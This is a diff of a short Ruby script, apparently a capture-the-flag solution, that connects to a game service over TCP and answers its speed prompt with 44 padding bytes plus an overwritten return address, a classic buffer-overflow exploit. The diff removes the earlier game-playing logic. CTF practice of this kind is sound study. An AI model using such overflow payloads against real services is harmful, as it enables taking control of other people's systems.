@@ -7,16 +7,12 @@ port = PORT
 
 # fill total 44 char
 buf = ''
-# buf << '9'
 44.times { buf << 'a' }
-
 # fill the return address
 buf << "\xcd\x88\x04\x08"
 buf << "\r\n"
 puts buf
 
-played = 0
-count = 0
 s = TCPSocket.open(hostname, port)
 while line = s.gets
   # Read lines from the socket
@@ -28,17 +24,5 @@ while line = s.gets
   # send speed setting
   (line.chop.eql? 'Choose the speed level(1-9):') && s.send(buf, 0)
 
-  # hit a block
-  if count >= 1
-    played = 1 # just played once
-    next
-  end
-
-  # get the word!
-  lines = line.chop.split('|')
-  if lines.size.eql? 4
-    s.send(lines[2] + "\r\n", 0)
-    count += 1
-  end
 end
 s.close
